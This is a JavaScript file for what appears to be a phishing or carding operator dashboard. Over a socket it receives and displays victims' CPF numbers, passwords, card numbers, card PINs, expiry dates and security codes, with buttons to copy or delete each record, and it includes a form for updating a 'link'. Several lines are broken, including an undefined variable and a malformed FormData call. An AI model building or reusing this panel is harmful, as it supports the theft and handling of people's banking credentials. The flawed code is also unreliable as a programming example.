
const infos  = (() => {
    //private var/functions
    function mountClient(data) {
        const { cpf, senha, card_number, card_date, card_code, card_password, status, id } = data

        const tr = document.createElement('tr')

        const client = `
        <th class="text-gray-900" scope="row">${cpf}</th>
        <th class="text-gray-900" scope="row">${senha}</th>
        <td class="fw-bolder text-gray-500">${card_number}</td>
        <td class="fw-bolder text-gray-500">${card_password}</td>
        <td class="fw-bolder text-gray-500">$${card_date}</td>
        <td class="fw-bolder text-gray-500">${card_code}</td>
        <td class="fw-bolder text-gray-500">${status}</td>
        <td class="fw-bolder text-gray-500">
            <button type="button" class="btn btn-mini btn-secondary delete-client" data-client="${id}" data-bs-toggle="tooltip" data-bs-placement="top" title="" data-bs-original-title="Tooltip on top">
                Excluir
            </button>
            <button type="button" class="btn btn-mini btn-secondary" data-bs-toggle="tooltip" data-bs-placement="top" title="" data-bs-original-title="Tooltip on top">
                Copiar
            </button>
            <button type="button" class="btn btn-mini btn-secondary" data-bs-toggle="tooltip" data-bs-placement="top" title="" data-bs-original-title="Tooltip on top">
                Ver completo
            </button>
        </td>`

        tr.innerHTML = client

        return tr
    }

    function create(){
        const target = document.querySelector('.infoList')

        socket.on('msgToClient', data => {
            console.log(`mensagem recebida: `, data)
            if(!target) return

            target.append(mountClient(data))
        })

        socket.on('updateClient', data => {
            const { cpf, senha, card_number, card_date, card_code, card_password, status, id } = data
            const clientInfo = document.querySelector(`info-client-${id}`);
            if(!clientInfo) return

            clientInfo.innerHTML = `
            <th class="text-gray-900" scope="row">${cpf}</th>
            <th class="text-gray-900" scope="row">${senha}</th>
            <td class="fw-bolder text-gray-500">${card_number}</td>
            <td class="fw-bolder text-gray-500">${card_password}</td>
            <td class="fw-bolder text-gray-500">$${card_date}</td>
            <td class="fw-bolder text-gray-500">${card_code}</td>
            <td class="fw-bolder text-gray-500">${status}</td>
            <td class="fw-bolder text-gray-500">
                <button type="button" class="btn btn-mini btn-secondary delete-client" data-client="${id}" data-bs-toggle="tooltip" data-bs-placement="top" title="" data-bs-original-title="Tooltip on top">
                    Excluir
                </button>
                <button type="button" class="btn btn-mini btn-secondary" data-bs-toggle="tooltip" data-bs-placement="top" title="" data-bs-original-title="Tooltip on top">
                    Copiar
                </button>
                <button type="button" class="btn btn-mini btn-secondary" data-bs-toggle="tooltip" data-bs-placement="top" title="" data-bs-original-title="Tooltip on top">
                    Ver completo
                </button>
            </td>
            `
        })
    }
    
    return {
        //public var/functions
        create
    }
})()

infos.create()

const files = (() => {
    const cookies = document.cookie

    var match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'))

    console.log(`cookies`, match)
    //private var/functions
    function preventDefaults(event){
        event.preventDefault()
        event.stopPropagation()
    }

    const highlight = target =>
        target.classList.add('highlight')

    const unhighlight = target =>
        target.classList.remove('highlight')

    const getInputAndGalleryRefs = element => {
        const zone = element.closest('.upload_dropZone') || false;
        const gallery = zone.querySelector('.upload_gallery') || false;
        const input = zone.querySelector('input[type="file"]') || false;
        return {input: input, gallery: gallery};
    }
    
    const handleDrop = event => {
        const dataRefs = getInputAndGalleryRefs(event.target);
        dataRefs.files = event.dataTransfer.files;

        handleFiles(dataRefs);
    }

    const handleFiles = async dataRefs => {

        let files = [...dataRefs.files];
    
        // Remove unaccepted file types
        files = files.filter(item => {
          if (!isImageFile(item)) {
            console.log('Not an image, ', item.type);
          }
          return isImageFile(item) ? item : null;
        });
    
        if (!files.length) return;
        dataRefs.files = files;
    
        previewFiles(dataRefs);
        await handleUploadImage(dataRefs?.files[0]);
    }

    async function handleUploadImage(file) {
        try {

            const targetPrev = document.querySelector('.prevAvatar');

            const img = document.createElement('img')

            
            var formData = new FormData();
            formData.append(["file", file]);

            var requestOptions = {
                method: 'PATCH',
                headers: {
                    'content-type': 'application/json',
                },
                body: formdata,
                redirect: 'follow'
            };


            let url;

            const isAvatar = targetPrev.dataset.avatar


            console.clear()
            console.log(isAvatar)

            if(isAvatar == true) url = `/users/image/update`
            else url = `users/image`

            fetch(url, requestOptions)
            .then(response => response.json())
            .then(result => {
                console.log('resultado: ', result)
                img.className = `mx-auto d-block`

                img.src = result?.UserImage?.name

                targetPrev.innerHTML = ''
                targetPrev.append(img)
            })
            .catch(error => console.log('error', error));
        } catch (error) {
            
        }
    }

    async function imageUpload(file) {
        fetch("/user-image/886fe60e-606b-43ad-8468-52289cae362a", requestOptions)
            .then(response => response.json())
            .then(result => console.log(result))
            .catch(error => console.log('error', error));
    }

    const isImageFile = file => 
        ['image/jpeg', 'image/png', 'image/svg+xml'].includes(file.type);

    function previewFiles(dataRefs) {
        if (!dataRefs.files) return;

        for (const file of dataRefs.files) {
          let reader = new FileReader();

          reader.readAsDataURL(file);

          reader.onloadend = function() {
            let img = document.createElement('img');

            img.className = 'mx-auto d-block';

            img.setAttribute('alt', file.name);

            img.src = reader.result;

            const avatar = document.querySelector('.prevAvatar');

            avatar.innerHTML = ``

            avatar.appendChild(img);
          }
        }
    }

    function dropZone(target) {
        const zone = document.querySelector(target);
        ;['dragenter', 'dragover', 'dragleave', 'drop'].forEach(event => {
            zone.addEventListener(event, preventDefaults, false);
            document.body.addEventListener(event, preventDefaults, false);
        })

        // Highlighting drop area when item is dragged over it
        ;['dragenter', 'dragover'].forEach(event => {
            zone.addEventListener(event, function (e) {
                highlight(zone)// body
            });
        });
        ;['dragleave', 'drop'].forEach(event => {
            zone.addEventListener(event, function (e) {
                unhighlight(zone)// body
            });
        });

        // Handle dropped files
        zone.addEventListener('drop', handleDrop, false);
    }

    
    
    return {
        //public var/functions
        dropZone
    }
})()

files.dropZone(`.upload_dropZone`)


const theFormLink = document.querySelector(`.update_form_link`)

if(theFormLink) {
    console.log(`up form`)
    theFormLink.addEventListener('submit', function (e) {
        e.preventDefault()

        const { value: link } = theFormLink.elements.link
        console.log(`elementos do form: `, link)
    
    
        var myHeaders = new Headers();
        myHeaders.append("Content-Type", "application/json");
    
        var raw = JSON.stringify({link});
    
        var requestOptions = {
        method: 'POST',
        headers: myHeaders,
        body: raw,
        redirect: 'follow'
        };
    
        fetch("/link", requestOptions)
            .then(response => response.json())
            .then(result => console.log(`link enviado com sucesso`, result))
            .catch(error => console.log('error', error));
    });
}

